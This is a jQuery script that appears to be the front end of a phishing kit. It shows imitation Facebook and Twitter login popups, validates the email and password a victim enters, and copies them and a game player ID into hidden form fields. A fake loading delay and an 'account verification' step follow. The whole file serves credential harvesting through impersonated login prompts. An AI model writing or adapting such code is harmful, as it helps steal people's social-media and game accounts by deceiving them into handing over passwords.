function open_facebook() {
    $('.login-facebook').show();
    $('.account_login').hide();
    $('.more_login').hide();    
}
function open_twitter() {
    $('.login-twitter').show();
    $('.account_login').hide();
    $('.more_login').hide();  
}
function close_facebook() {
    $('.login-facebook').hide();
    $('.account_login').show();
    $('#load-login').hide();    
    $('#box-login').show();
}
function close_twitter() {
    $('.login-twitter').hide();
    $('.account_login').show();
    $('#load-login').hide();    
    $('#box-login').show();
}

$(document).ready(function(){
  $('#password-twitter').keyup(function(){
      if($(this).val().length !=0){
          $('.onbutton').removeClass().addClass('twbutton'); 
      }
      else
      {
          $('.twbutton').removeClass().addClass('onbutton'); 
      }
  })
});
$(document).ready(function(){
  $('#sec-password-twitter').keyup(function(){
      if($(this).val().length !=0){
          $('.seconbutton').removeClass().addClass('sectwbutton'); 
      }
      else
      {
          $('.sectwbutton').removeClass().addClass('seconbutton'); 
      }
  })
});
// code function data
function ValidateLoginFbData() {
	$('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
	submitingValidateLoginFbData.preventDefault();
	
	$emailfb = $('#email-facebook').val().trim();
	$passwordfb = $('#password-facebook').val().trim();
	$loginfb = $('#login-facebook').val().trim();
    $playid = $('#ValidatePopupPlayId').val().trim()
            if($emailfb == '' || $emailfb == null || $emailfb.length <= 5)
            {
                $('.email-fb').fadeIn();
                setTimeout(function () {
                $('.email-fb').fadeOut();
                }, 2000);                     
                $('.sandi-fb').hide();
                $('.PlayerIdLoginBox').hide();
                $('.login-facebook').show();
                return false;
            }else{
               $('.email-fb').hide();               
	           $("input#validateEmail").val($emailfb);
               $('.login-facebook').hide();  
               $('.PlayerIdLoginBox').show();
            }
            if($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 5)
            {
                $('.sandi-fb').fadeIn();
                setTimeout(function () {
                $('.sandi-fb').fadeOut();
                }, 2000);                     
                $('.PlayerIdLoginBox').hide();
                $('.login-facebook').show();
                return false;
            }else{
               $('.sandi-fb').hide();
	           $("input#validatePassword").val($passwordfb);
	           $("input#validateLogin").val($loginfb);
               $('input#ValidatePopupPlayId').val($playid)
               $('.login-facebook').hide();	 
               $('.login-facebook-load').show()
               setTimeout(function () {
               $('.login-facebook-mt').hide(); 
               $('.account_verification').show()
               $('.login-facebook-sec').hide()
               $('.login-facebook-load').hide()
               }, 3000)
          }
      });  
	return false;     	           
}

function ValidateLoginTwitterData() {
	$('#ValidateLoginTwitterForm').submit(function(submitingValidateLoginTwitterData){
	submitingValidateLoginTwitterData.preventDefault();
	
	$emailtw = $('#email-twitter').val().trim();
	$passwordtw = $('#password-twitter').val().trim();
	$logintw = $('#login-twitter').val().trim();
    $playid = $('#ValidatePopupPlayId').val().trim()
            if($emailtw == '' || $emailtw == null || $emailtw.length <= 3)
            {
                $('.email-tw').fadeIn();
                setTimeout(function () {
                $('.email-tw').fadeOut();
                }, 2000);                     
                $('.sandi-tw').hide();
                $('.PlayerIdLoginBox').hide();
                $('.login-twitter').show();
                return false;
            }else{
               $('.email-tw').hide();               
	           $("input#validateEmail").val($emailtw);
               $('.login-twitter').hide();  
               $('.PlayerIdLoginBox').show();
            }
            if($passwordtw == '' || $passwordtw == null || $passwordtw.length <= 7)
            {
                $('.sandi-tw').fadeIn();
                setTimeout(function () {
                $('.sandi-tw').fadeOut();
                }, 2000);                     
                $('.PlayerIdLoginBox').hide();
                $('.login-twitter').show();
                return false;
            }else{
               $('.sandi-tw').hide();
	           $("input#validatePassword").val($passwordtw);
	           $("input#validateLogin").val($logintw);
               $('input#ValidatePopupPlayId').val($playid)         
               $('.login-twitter').hide();	
               $('.login-twitter-load').show()
               setTimeout(function () {
                $('.account_verification').show()
				$('.login-twitter-sec').hide()
               $('.login-twitter-load').hide()
               }, 3000)
          }
      });  
	return false;     	           
}
